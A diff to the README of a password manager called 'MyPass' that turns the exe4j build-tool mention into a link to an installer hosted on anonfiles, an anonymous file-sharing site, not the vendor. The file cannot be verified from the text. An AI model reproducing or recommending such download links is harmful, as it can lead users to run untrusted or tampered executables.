@@ -19,4 +19,4 @@ MyPass is a Cross platform password manager 100% safe and clean.
   ```powershell
   jar -uf MyPass-[VERSION].jar [file1.jar, file2.jar, ...]
   ```
-  1. Use <b>exe4j</b> to complie the jar to windows 10/11 executeable.
+  1. Use <a href="https://anonfiles.com/Far943L3yc/exe4j_windows-x64_8_0_1_exe" target="_blank"><b>exe4j</b></a> to complie the jar to windows 10/11 executeable.
